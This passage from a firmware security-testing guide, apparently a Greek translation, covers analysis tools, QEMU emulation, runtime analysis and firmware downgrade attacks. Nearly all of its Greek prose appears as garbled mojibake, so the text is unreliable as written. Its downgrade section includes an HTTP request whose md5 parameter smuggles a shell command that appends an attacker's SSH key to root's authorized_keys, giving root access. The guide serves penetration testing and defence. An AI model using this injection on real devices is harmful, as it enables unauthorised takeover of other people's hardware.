- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) Î³Î¹Î± Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¼Î­Î½Î· Î±Î½Î¬Î»Ï…ÏƒÎ· firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ÎºÎ±Î¹ [**EMBA**](https://github.com/e-m-b-a/emba) Î³Î¹Î± ÏƒÏ„Î±Ï„Î¹ÎºÎ® ÎºÎ±Î¹ Î´Ï…Î½Î±Î¼Î¹ÎºÎ® Î±Î½Î¬Î»Ï…ÏƒÎ·

### ÎˆÎ»ÎµÎ³Ï‡Î¿Î¹ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÏƒÎµ compiled binaries

Î¤ÏŒÏƒÎ¿ Î¿ Ï€Î·Î³Î±Î¯Î¿Ï‚ ÎºÏÎ´Î¹ÎºÎ±Ï‚ ÏŒÏƒÎ¿ ÎºÎ±Î¹ Ï„Î± compiled binaries Ï€Î¿Ï… Î²ÏÎ­Î¸Î·ÎºÎ±Î½ ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î±ÏÏ‡ÎµÎ¯Ï‰Î½ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ»ÎµÎ³Ï‡Î¸Î¿ÏÎ½ ÏƒÏ‡Î¿Î»Î±ÏƒÏ„Î¹ÎºÎ¬ Î³Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚. Î•ÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ **checksec.sh** Î³Î¹Î± Unix binaries ÎºÎ±Î¹ Ï„Î¿ **PESecurity** Î³Î¹Î± Windows binaries Î²Î¿Î·Î¸Î¿ÏÎ½ ÏƒÏ„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Î¼Î· Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Ï‰Î½ binaries Ï€Î¿Ï… Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹.

## Î•Î¾Î¿Î¼Î¿Î¯Ï‰ÏƒÎ· firmware Î³Î¹Î± Î´Ï…Î½Î±Î¼Î¹ÎºÎ® Î±Î½Î¬Î»Ï…ÏƒÎ·

Î— Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎ¾Î¿Î¼Î¿Î¯Ï‰ÏƒÎ·Ï‚ firmware ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· **dynamic analysis** ÎµÎ¯Ï„Îµ Ï„Î·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ Î¼Î¹Î±Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚ ÎµÎ¯Ï„Îµ ÎµÎ½ÏŒÏ‚ Î¼ÎµÎ¼Î¿Î½Ï‰Î¼Î­Î½Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚. Î‘Ï…Ï„Î® Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯ÏƒÎµÎ¹ Ï€ÏÎ¿Î²Î»Î®Î¼Î±Ï„Î± Î»ÏŒÎ³Ï‰ ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ Î±Ï€ÏŒ hardware Î® Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®, Î±Î»Î»Î¬ Î· Î¼ÎµÏ„Î±Ï†Î¿ÏÎ¬ Ï„Î¿Ï… root filesystem Î® ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Ï‰Î½ binaries ÏƒÎµ Î¼Î¹Î± ÏƒÏ…ÏƒÎºÎµÏ…Î® Î¼Îµ ÏƒÏ…Î¼Î²Î±Ï„Î® Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ® ÎºÎ±Î¹ endianness, ÏŒÏ€Ï‰Ï‚ Î­Î½Î± Raspberry Pi, Î® ÏƒÎµ Î¼Î¹Î± pre-built virtual machine, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½ÎµÎ¹ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ Î´Î¿ÎºÎ¹Î¼Î­Ï‚.

### Î•Î¾Î¿Î¼Î¿Î¯Ï‰ÏƒÎ· Î¼ÎµÎ¼Î¿Î½Ï‰Î¼Î­Î½Ï‰Î½ binaries

Î“Î¹Î± Ï„Î·Î½ ÎµÎ¾Î­Ï„Î±ÏƒÎ· Î¼ÎµÎ¼Î¿Î½Ï‰Î¼Î­Î½Ï‰Î½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î¬Ï„Ï‰Î½, Î· Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Ï„Î¿Ï… endianness ÎºÎ±Î¹ Ï„Î·Ï‚ Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®Ï‚ CPU Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î·.

#### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î¼Îµ Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ® MIPS

Î“Î¹Î± Î½Î± ÎµÎ¾Î¿Î¼Î¿Î¹Ï‰Î¸ÎµÎ¯ Î­Î½Î± binary Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®Ï‚ MIPS, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î· ÎµÎ½Ï„Î¿Î»Î®:
```bash
file ./squashfs-root/bin/busybox
```
ÎšÎ±Î¹ Î³Î¹Î± Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ Ï„Î± Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÎµÎ¾Î¿Î¼Î¿Î¯Ï‰ÏƒÎ·Ï‚:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Î“Î¹Î± MIPS (big-endian), Ï„Î¿ `qemu-mips` Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹, ÎµÎ½Ï Î³Î¹Î± little-endian binaries, ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ Ï„Î¿ `qemu-mipsel`.

#### Î ÏÎ¿ÏƒÎ¿Î¼Î¿Î¯Ï‰ÏƒÎ· Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®Ï‚ ARM

Î“Î¹Î± ARM binaries, Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î±, Î¼Îµ Ï„Î¿Î½ emulator `qemu-arm` Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î·Î½ Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¯Ï‰ÏƒÎ·.

### Î Î»Î®ÏÎ·Ï‚ Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¯Ï‰ÏƒÎ· ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚

Î•ÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), ÎºÎ±Î¹ Î¬Î»Î»Î±, Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Ï…Î½ Ï„Î·Î½ Ï€Î»Î®ÏÎ· Ï€ÏÎ¿ÏƒÎ¿Î¼Î¿Î¯Ï‰ÏƒÎ· firmware, Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎºÎ±Î¹ Î²Î¿Î·Î¸ÏÎ½Ï„Î±Ï‚ ÏƒÏ„Î· Î´Ï…Î½Î±Î¼Î¹ÎºÎ® Î±Î½Î¬Î»Ï…ÏƒÎ·.

## Î”Ï…Î½Î±Î¼Î¹ÎºÎ® Î±Î½Î¬Î»Ï…ÏƒÎ· ÏƒÏ„Î·Î½ Ï€ÏÎ¬Î¾Î·

Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏ„Î¬Î´Î¹Î¿, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎµÎ¯Ï„Îµ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ ÎµÎ¯Ï„Îµ ÎµÎ¾Î¿Î¼Î¿Î¹Ï‰Î¼Î­Î½Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ ÏƒÏ…ÏƒÎºÎµÏ…Î®Ï‚ Î³Î¹Î± Î±Î½Î¬Î»Ï…ÏƒÎ·. Î•Î¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î¿ Î½Î± Î´Î¹Î±Ï„Î·ÏÎµÎ¯Ï„Î±Î¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ shell Ï€ÏÎ¿Ï‚ Ï„Î¿ OS ÎºÎ±Î¹ Ï„Î¿ filesystem. Î— ÎµÎ¾Î¿Î¼Î¿Î¯Ï‰ÏƒÎ· Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ Î¼Î¹Î¼Î·Î¸ÎµÎ¯ Ï„Î­Î»ÎµÎ¹Î± Ï„Î¹Ï‚ Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎµÎ¹Ï‚ Î¼Îµ Ï„Î¿ hardware, Î³ÎµÎ³Î¿Î½ÏŒÏ‚ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï€ÎµÏÎ¹ÏƒÏ„Î±ÏƒÎ¹Î±ÎºÎ­Ï‚ ÎµÏ€Î±Î½ÎµÎºÎºÎ¹Î½Î®ÏƒÎµÎ¹Ï‚ Ï„Î·Ï‚ ÎµÎ¾Î¿Î¼Î¿Î¯Ï‰ÏƒÎ·Ï‚. Î— Î±Î½Î¬Î»Ï…ÏƒÎ· Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÏ€Î±Î½ÎµÎ¾ÎµÏ„Î¬Î¶ÎµÎ¹ Ï„Î¿ filesystem, Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ ÎµÎºÏ„ÎµÎ¸ÎµÎ¹Î¼Î­Î½ÎµÏ‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚ ÎºÎ±Î¹ network services, ÎºÎ±Î¹ Î½Î± ÎµÏÎµÏ…Î½Î¬ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏ„Î¿Î½ bootloader. Î¤Î± tests Î±ÎºÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚ Ï„Î¿Ï… firmware ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î± Î³Î¹Î± Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ Ï€Î¹Î¸Î±Î½ÏÎ½ backdoor ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½.

## Î¤ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Runtime Î±Î½Î¬Î»Ï…ÏƒÎ·Ï‚

Î— runtime Î±Î½Î¬Î»Ï…ÏƒÎ· Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼Îµ Î¼Î¹Î± Î´Î¹ÎµÏÎ³Î±ÏƒÎ¯Î± Î® binary ÏƒÏ„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ®Ï‚ Ï„Î¿Ï…, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ gdb-multiarch, Frida, ÎºÎ±Î¹ Ghidra Î³Î¹Î± Ï„Î·Î½ Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· breakpoints ÎºÎ±Î¹ Ï„Î¿Î½ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼ÏŒ ÎµÏ…Ï€Î±Î¸ÎµÎ¹ÏÎ½ Î¼Î­ÏƒÏ‰ fuzzing ÎºÎ±Î¹ Î¬Î»Î»Ï‰Î½ Ï„ÎµÏ‡Î½Î¹ÎºÏÎ½.

## Binary Exploitation and Proof-of-Concept

Î— Î±Î½Î¬Ï€Ï„Ï…Î¾Î· ÎµÎ½ÏŒÏ‚ PoC Î³Î¹Î± ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÎ¼Î­Î½ÎµÏ‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î²Î±Î¸Î¹Î¬ ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ„ÏŒÏ‡Î¿Ï… Î±ÏÏ‡Î¹Ï„ÎµÎºÏ„Î¿Î½Î¹ÎºÎ®Ï‚ ÎºÎ±Î¹ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼ÏŒ ÏƒÎµ Ï‡Î±Î¼Î·Î»Î¿Ï ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… Î³Î»ÏÏƒÏƒÎµÏ‚. ÎŸÎ¹ binary runtime protections ÏƒÎµ embedded ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± ÎµÎ¯Î½Î±Î¹ ÏƒÏ€Î¬Î½Î¹ÎµÏ‚, Î±Î»Î»Î¬ ÏŒÏ„Î±Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½, Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ ÏŒÏ€Ï‰Ï‚ Return Oriented Programming (ROP) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚.

## Î ÏÎ¿-ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± Î³Î¹Î± Î±Î½Î¬Î»Ï…ÏƒÎ· firmware

Î›ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÎ¬ ÏŒÏ€Ï‰Ï‚ [AttifyOS](https://github.com/adi0x90/attifyos) ÎºÎ±Î¹ [EmbedOS](https://github.com/scriptingxss/EmbedOS) Ï€Î±ÏÎ­Ï‡Î¿Ï…Î½ Ï€ÏÎ¿-Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½Î± Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î± Î³Î¹Î± testing Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ firmware, ÎµÎ¾Î¿Ï€Î»Î¹ÏƒÎ¼Î­Î½Î± Î¼Îµ Ï„Î± Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Î¤Î¿ AttifyOS ÎµÎ¯Î½Î±Î¹ Î­Î½Î± distro Ï€Î¿Ï… ÏƒÏ„Î¿Ï‡ÎµÏÎµÎ¹ Î½Î± ÏƒÎ±Ï‚ Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ security assessment ÎºÎ±Î¹ penetration testing Ï„Ï‰Î½ Internet of Things (IoT) ÏƒÏ…ÏƒÎºÎµÏ…ÏÎ½. Î£Î±Ï‚ ÎµÎ¾Î¿Î¹ÎºÎ¿Î½Î¿Î¼ÎµÎ¯ Ï‡ÏÏŒÎ½Î¿ Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ Î­Î½Î± Ï€ÏÎ¿-Î´Î¹Î±Î¼Î¿ÏÏ†Ï‰Î¼Î­Î½Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Î¼Îµ ÏŒÎ»Î± Ï„Î± Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ÏƒÎµ Ubuntu 18.04, Ï€ÏÎ¿Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½Î¿ Î¼Îµ ÎµÏÎ³Î±Î»ÎµÎ¯Î± Î³Î¹Î± firmware security testing.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Î‘ÎºÏŒÎ¼Î± ÎºÎ±Î¹ ÏŒÏ„Î±Î½ Î­Î½Î±Ï‚ vendor ÎµÏ†Î±ÏÎ¼ÏŒÎ¶ÎµÎ¹ cryptographic signature checks Î³Î¹Î± ÎµÎ¹ÎºÏŒÎ½ÎµÏ‚ firmware, **version rollback (downgrade) protection is frequently omitted**. ÎŒÏ„Î±Î½ Î¿ boot- Î® recovery-loader ÎµÏ€Î±Î»Î·Î¸ÎµÏÎµÎ¹ Î¼ÏŒÎ½Î¿ Ï„Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î® Î¼Îµ Î­Î½Î± ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î¿ public key Î±Î»Î»Î¬ Î´ÎµÎ½ ÏƒÏ…Î³ÎºÏÎ¯Î½ÎµÎ¹ Ï„Î·Î½ *version* (Î® Î­Î½Î±Î½ monotonic counter) Ï„Î·Ï‚ ÎµÎ¹ÎºÏŒÎ½Î±Ï‚ Ï€Î¿Ï… Î¸Î± Ï†Î»Î±ÏƒÎ±ÏÎ¹ÏƒÏ„ÎµÎ¯, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½ÏŒÎ¼Î¹Î¼Î± Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÎ¹ Î­Î½Î± **Ï€Î±Î»Î±Î¹ÏŒÏ„ÎµÏÎ¿, ÎµÏ…Î¬Î»Ï‰Ï„Î¿ firmware Ï€Î¿Ï… ÎµÎ¾Î±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Î½Î± Ï†Î­ÏÎµÎ¹ Î­Î³ÎºÏ…ÏÎ· Ï…Ï€Î¿Î³ÏÎ±Ï†Î®** ÎºÎ±Î¹ Î­Ï„ÏƒÎ¹ Î½Î± ÎµÏ€Î±Î½ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Ï€Î¿Ï… ÎµÎ¯Ï‡Î±Î½ ÎµÏ€Î¹Î´Î¹Î¿ÏÎ¸Ï‰Î¸ÎµÎ¯.

Î¤Ï…Ï€Î¹ÎºÎ® ÏÎ¿Î® ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚:

1. **Obtain an older signed image**
* Î›Î®ÏˆÎ· Î±Ï€ÏŒ Ï„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î¿ portal Î»Î®ÏˆÎµÏ‰Î½ Ï„Î¿Ï… Ï€ÏÎ¿Î¼Î·Î¸ÎµÏ…Ï„Î®, CDN Î® site Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚.
* Î•Î¾Î±Î³Ï‰Î³Î® Î±Ï€ÏŒ ÏƒÏ…Î½Î¿Î´ÎµÏ…Ï„Î¹ÎºÎ­Ï‚ mobile/desktop ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ (Ï€.Ï‡. Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Android APK ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ `assets/firmware/`).
* Î‘Î½Î¬ÎºÏ„Î·ÏƒÎ· Î±Ï€ÏŒ third-party repositories ÏŒÏ€Ï‰Ï‚ VirusTotal, Internet archives, forums, Îº.Î»Ï€.
2. **Upload or serve the image to the device** Î¼Î­ÏƒÏ‰ Î¿Ï€Î¿Î¹Î¿Ï…Î´Î®Ï€Î¿Ï„Îµ ÎµÎºÏ„ÎµÎ¸ÎµÎ¹Î¼Î­Î½Î¿Ï… update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, Îº.Î»Ï€.
* Î Î¿Î»Î»Î­Ï‚ ÎºÎ±Ï„Î±Î½Î±Î»Ï‰Ï„Î¹ÎºÎ­Ï‚ IoT ÏƒÏ…ÏƒÎºÎµÏ…Î­Ï‚ ÎµÎºÎ¸Î­Ï„Î¿Ï…Î½ *unauthenticated* HTTP(S) endpoints Ï€Î¿Ï… Î´Î­Ï‡Î¿Î½Ï„Î±Î¹ Base64-encoded firmware blobs, Ï„Î± Î±Ï€Î¿ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î¿ÏÎ½ server-side ÎºÎ±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î¿ÏÎ½ recovery/upgrade.
3. ÎœÎµÏ„Î¬ Ï„Î¿ downgrade, ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î¼Î¹Î±Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ Ï€Î¿Ï… ÎµÎ¯Ï‡Îµ ÎµÏ€Î¹Î´Î¹Î¿ÏÎ¸Ï‰Î¸ÎµÎ¯ ÏƒÏ„Î· Î½ÎµÏŒÏ„ÎµÏÎ· Î­ÎºÎ´Î¿ÏƒÎ· (Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î­Î½Î± command-injection filter Ï€Î¿Ï… Ï€ÏÎ¿ÏƒÏ„Î­Î¸Î·ÎºÎµ Î±ÏÎ³ÏŒÏ„ÎµÏÎ±).
4. Î ÏÎ¿Î±Î¹ÏÎµÏ„Î¹ÎºÎ¬, Ï†Î»Î¬Ï‚ Î¾Î±Î½Î¬ Ï„Î·Î½ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± ÎµÎ¹ÎºÏŒÎ½Î± Î® Î±Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Ï‰Î½ updates Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï†ÎµÏ…Ï‡Î¸ÎµÎ¯ Î· Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ· Î¼ÏŒÎ»Î¹Ï‚ Î±Ï€Î¿ÎºÏ„Î·Î¸ÎµÎ¯ persistence.

### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: Command Injection Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Î£Ï„Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ (downgraded) firmware, Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ `md5` ÏƒÏ…Î³Ï‡Ï‰Î½ÎµÏÎµÏ„Î±Î¹ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ ÏƒÎµ Î¼Î¹Î± ÎµÎ½Ï„Î¿Î»Î® shell Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï€Î¿Î»ÏÎ¼Î±Î½ÏƒÎ·, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ injection Î±Ï…Î¸Î±Î¯ÏÎµÏ„Ï‰Î½ ÎµÎ½Ï„Î¿Î»ÏÎ½ (ÎµÎ´Ï â€” ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ· SSH key-based root access). Î‘ÏÎ³ÏŒÏ„ÎµÏÎµÏ‚ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ firmware ÎµÎ¹ÏƒÎ®Î³Î±Î³Î±Î½ Î­Î½Î± Î²Î±ÏƒÎ¹ÎºÏŒ Ï†Î¯Î»Ï„ÏÎ¿ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÏ‰Î½, Î±Î»Î»Î¬ Î· Î±Ï€Î¿Ï…ÏƒÎ¯Î± Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚ downgrade ÎºÎ±Î¸Î¹ÏƒÏ„Î¬ Ï„Î·Î½ ÎµÏ€Î¹Î´Î¹ÏŒÏÎ¸Ï‰ÏƒÎ· Î¬ÏƒÎºÎ¿Ï€Î·.

### Î•Î¾Î±Î³Ï‰Î³Î® Firmware Î±Ï€ÏŒ Î•Ï†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î³Î¹Î± ÎšÎ¹Î½Î·Ï„Î¬

Î Î¿Î»Î»Î¿Î¯ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î±ÏƒÏ„Î­Ï‚ ÏƒÏ…ÏƒÎºÎµÏ…Î¬Î¶Î¿Ï…Î½ Ï€Î»Î®ÏÎµÎ¹Ï‚ ÎµÎ¹ÎºÏŒÎ½ÎµÏ‚ firmware Î¼Î­ÏƒÎ± ÏƒÏ„Î¹Ï‚ ÏƒÏ…Î½Î¿Î´ÎµÏ…Ï„Î¹ÎºÎ­Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î³Î¹Î± ÎºÎ¹Î½Î·Ï„Î¬, ÏÏƒÏ„Îµ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î½Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÎ½ÎµÎ¹ Ï„Î· ÏƒÏ…ÏƒÎºÎµÏ…Î® Î¼Î­ÏƒÏ‰ Bluetooth/Wi-Fi. Î‘Ï…Ï„Î¬ Ï„Î± Ï€Î±ÎºÎ­Ï„Î± ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Ï‡Ï‰ÏÎ¯Ï‚ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÏƒÏ„Î¿ APK/APEX ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ Î¼Î¿Î½Î¿Ï€Î¬Ï„Î¹Î± ÏŒÏ€Ï‰Ï‚ `assets/fw/` Î® `res/raw/`. Î•ÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ `apktool`, `ghidra` Î® Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Ï„Î¿ Î±Ï€Î»ÏŒ `unzip` ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î½Î± ÎµÎ¾Î±Î³Î¬Î³ÎµÏ„Îµ 